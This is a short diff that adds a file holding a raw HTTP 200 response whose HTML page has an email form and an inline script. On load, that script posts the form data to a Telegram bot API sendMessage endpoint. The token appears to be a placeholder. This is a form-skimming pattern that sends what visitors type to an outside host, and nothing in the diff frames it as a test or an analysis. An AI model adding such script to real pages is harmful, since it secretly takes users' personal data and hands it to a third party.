@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form id="c"><input name="email"></form><script>fetch("https://api.telegram.org/bot1:A/sendMessage", {method: "POST", body: new FormData(document.getElementById("c"))});</script></body></html>
